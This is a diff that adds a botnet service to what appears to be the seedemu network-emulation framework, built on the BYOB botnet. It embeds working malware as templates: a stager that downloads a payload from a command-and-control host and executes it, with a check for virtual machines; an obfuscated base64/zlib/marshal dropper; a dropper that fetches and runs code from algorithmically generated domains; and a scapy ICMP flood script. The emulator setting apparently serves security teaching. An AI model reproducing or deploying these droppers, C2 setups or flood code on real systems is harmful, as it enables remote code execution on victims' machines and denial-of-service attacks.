@@ -1,3 +1,13 @@
+#!/usr/bin/env python3
+# encoding: utf-8
+# __author__ = 'Demon'
+from seedemu.core import Node, Service, Server
+from typing import Dict
+import zlib, base64, marshal, inspect
+
+BotnetServerFileTemplates: Dict[str, str] = {}
+
+BotnetServerFileTemplates['payload'] = '''\
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Loader (Build Your Own Botnet)'
@@ -31,9 +41,9 @@ class Loader(object):
         self.base_url = base_url + '/'
         self.non_source = False
         self.reload = False
-        '''
+        \'\'\'
         self.mod_msg = {}
-        '''
+        \'\'\'
 
     def find_module(self, fullname, path=None):
         log(level='debug', info= "FINDER=================")
@@ -55,20 +65,20 @@ class Loader(object):
         if fullname.split('.').count(fullname.split('.')[-1]) > 1:
             log(level='info', info= "[-] Found locally!")
             return None
-        '''
+        \'\'\'
         msg = self.__get_source(fullname,path)
         if msg==None:
             return None
         is_package,final_url,source_code=msg
         self.mod_msg.setdefault(fullname,MsgClass(is_package,final_url,source_code))
-        '''
+        \'\'\'
         log(level='info', info= "[+] Module/Package '%s' can be loaded!" % fullname)
         return self
 
     def load_module(self, name):
-        '''
+        \'\'\'
         mod_msg=self.mod_msg.get(fullname)
-        '''
+        \'\'\'
         imp.acquire_lock()
         log(level='debug', info= "LOADER=================")
         log(level='debug', info= "Loading %s..." % name)
@@ -128,7 +138,7 @@ class Loader(object):
         imp.release_lock()
         return mod
 
-    '''
+    \'\'\'
     def __get_source(self,fullname,path):
         url=self.baseurl+"/".join(fullname.split("."))
         source=None
@@ -153,7 +163,7 @@ class Loader(object):
                 return None
 
         return is_package,final_url,source
-    '''
+    \'\'\'
 
     def __fetch_compiled(self, url):
         import marshal
@@ -2607,3 +2617,301 @@ class Miner(multiprocessing.Process):
 if __name__ == '__main__':
     _payload = Payload(pastebin='', host='{serverHost}', port='445')
     _payload.run()
+'''
+
+BotnetServerFileTemplates['stager'] = '''\
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+'Stager (Build Your Own Botnet)'
+
+# standard libarary
+import os
+import sys
+import struct
+import base64
+if sys.version_info[0] > 2:
+    from urllib.request import urlopen
+else:
+    from urllib import urlopen
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
+
+# main
+def decrypt(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
+    data = base64.b64decode(data)
+    blocks = [data[chunk * block_size:((chunk + 1) * block_size)] for chunk in range(len(data) // block_size)]
+    vector = blocks[0]
+    result = []
+    for block in blocks[1:]:
+        v0, v1 = struct.unpack("!2L", block)
+        k0 = struct.unpack("!4L", key[:key_size])
+        delta, mask = 0x9e3779b9, 0xffffffff
+        sum = (delta * num_rounds) & mask
+        for round in range(num_rounds):
+            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
+            sum = (sum - delta) & mask
+            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
+        decode = struct.pack("!2L", v0, v1)
+        output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
+        vector = block
+        result.append(output)
+    return str().join(result).rstrip(padding)
+
+def environment():
+    environment = [key for key in os.environ if 'VBOX' in key]
+    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
+    return bool(environment + processes)
+
+def run(url=None, key=None):
+    if url:
+        # if environment():
+            # if '--debug' in sys.argv:
+            #     if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
+            #         sys.exit(0)
+            # else:
+            #     sys.exit(0)
+        payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
+        exec(payload, globals())
+
+if __name__ == '__main__':
+    _run = run(url='http://{serverHost}:446//payloads/b6H.py')
+'''
+
+BotnetServerFileTemplates['dropper'] = """import sys,zlib,base64,marshal,json,urllib
+if sys.version_info[0] > 2:
+    from urllib import request
+urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))
+"""
+BotnetServerFileTemplates['start_command'] = """
+printf "%s" "waiting for C2 Server network ready ..."
+while ! ping -c 1 -n -w 1 {C2ServerIp} &> /dev/null
+do
+    printf "%c" "."
+done
+printf "\\n%s\\n"  "Server is ready"
+sleep 3
+python3 /tmp/BotClient.py
+"""
+
+BotnetServerFileTemplates['dga_dropper'] = """
+{dga}
+
+import random,sys,zlib,base64,marshal,json,urllib, time
+if sys.version_info[0] > 2:
+    from urllib import request
+
+while True:
+    time.sleep(4)
+    try:
+        domain_list = dga()
+        domain = random.choice(domain_list)
+        dropper_url = 'http://'+domain+':446//stagers/b6H.py'
+
+        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+        exec(urlopen(dropper_url).read())
+    except Exception:
+        print("[*] Connection error with domain {{}}, retrying...".format(domain))
+        continue
+
+"""
+
+
+BotnetServerFileTemplates['ddos_module'] = """from scapy.all import *
+import sys
+
+target = sys.argv[1]
+
+while True:
+    ip_hdr = IP(dst=target)
+    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
+    send(packet)"""
+
+DGA_DEFAULT_FUNCTION = """
+def dga() -> list:
+    #Generate 10 domains for the given time.
+    domain_list = []
+    domain = ""
+    import math, datetime
+    today = datetime.datetime.utcnow()
+    hour = today.hour
+    day = today.day
+    minute = today.minute
+    minute = int(math.ceil(minute/5))*5
+
+    for i in range(16):
+        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)
+        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)
+        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)
+        domain += chr(((day ^ hour ^ minute) % 25) + 97)
+        if i > 6:
+            domain_list.append(domain+ ".com")
+
+    return domain_list
+"""
+
+
+class BotnetServer(Server):
+    """!
+    @brief The BotnetServer class.
+    """
+
+    __port: int
+
+    def __init__(self):
+        """!
+        @brief BotnetServer constructor.
+        """
+        self.__port = 445
+
+    def setPort(self, port: int):
+        """!
+        @brief Set C2 port.
+
+        @param port port.
+        """
+        ## ! todo, not support to change port right now
+        self.__port = port
+
+    def install(self, node: Node):
+        """!
+        @brief Install the Botnet C2 server.
+        """
+        address = str(node.getInterfaces()[0].getAddress())
+
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') #Dependencies for Byob python lib.
+        node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", address)) # Copy payload to C2 server without manually generating by ourself.
+        node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", address)) # Copy stager to C2 server without manually generating by ourself.
+        node.appendStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port)) # Start C2 process in the background .
+
+    def print(self, indent: int) -> str:
+        out = ' ' * indent
+        out += 'BotnetServer'
+
+        return out
+
+class BotnetClientServer(Server):
+    """!
+    @brief The BotnetClientServer class.
+    """
+
+    __port: int
+
+    def __init__(self):
+        """!
+        @brief BotnetClient constructor.
+        """
+        self.__port = 445
+        self.__module = []
+
+    def setPort(self, port: int):
+        """!
+        @brief Set HTTP port.
+
+        @param port port.
+        """
+        ## ! todo, not support to change port right now
+        self.__port = port
+
+    def setServer(self, c2_server = '127.0.0.1', enable_dga = False, dga = None):
+        """!
+        @brief BotnetClient constructor.
+
+        @param c2_server C2 server address.
+        @param enable_dga (optional) set true to enable DGA.
+        @param dga (optional) DGA function, used for generating multiple random C2 domains.
+        """
+        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(c2_server)
+        self.__c2_server_ip = c2_server
+
+        if not enable_dga: # Not Enable DGA, using IP to connect to C2 server
+            self.__dropper = BotnetServerFileTemplates['dropper']\
+                        .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
+                                                                      .format(repr(self.__c2_server_url)),2)))))
+        else:
+            if dga is None: # Enable DGA, using default dga function
+                dga_source_code = DGA_DEFAULT_FUNCTION
+            else: # Enable DGA, using user provided dga function
+                dga_source_code = inspect.getsource(dga)
+            self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga = dga_source_code)
+
+    def setModule(self, filename: str, file_src: str):
+        """!
+        @brief pass file to bot client into folder /tmp/.
+        @param filename the file name will be in tmp folder.
+        @param file_src file path.
+        """
+
+        file_content = open(file_src, 'r').read()
+        self.__module.append({"filename": filename, "file_content": file_content})
+
+    def install(self, node: Node):
+        """!
+        @brief Install the service.
+        """
+        if len(self.__module) > 0: #if have modules, add them in bot client
+            for m in self.__module:
+                node.setFile('/tmp/'+ m.get('filename'), m.get('file_content'))
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') # Dependencies for Byob
+        node.addBuildCommand('pip3 install scapy') # Dependencies for simple DDoS module
+        node.setFile('/tmp/BotClient.py', self.__dropper) # Add Bot client payload
+        node.setFile('/tmp/ddos.py', BotnetServerFileTemplates['ddos_module'])
+        # start_command used for making sure the C2 server can be connected after network configuration ready.
+        node.appendStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))
+
+    def print(self, indent: int) -> str:
+        out = ' ' * indent
+        out += 'BotnetClient'
+
+        return out
+
+class BotnetService(Service):
+    """!
+    @brief Botnet C2 server service.
+    """
+
+    def __init__(self):
+        """!
+        @brief BotnetService constructor.
+        """
+        super().__init__()
+        self.addDependency('Base', False, False)
+
+    def _createServer(self) -> Server:
+        return BotnetServer()
+
+    def getName(self) -> str:
+        return 'BotnetService'
+
+    def print(self, indent: int) -> str:
+        out = ' ' * indent
+        out += 'BotnetServiceLayer\n'
+
+class BotnetClientService(Service):
+    """!
+    @brief Botnet client service.
+    """
+
+    def __init__(self):
+        """!
+        @brief BotnetService constructor.
+        """
+        super().__init__()
+        self.addDependency('Base', False, False)
+
+    def _createServer(self) -> Server:
+        return BotnetClientServer()
+
+    def getName(self) -> str:
+        return 'BotnetClientService'
+
+    def print(self, indent: int) -> str:
+        out = ' ' * indent
+        out += 'BotnetClientServiceLayer\n'
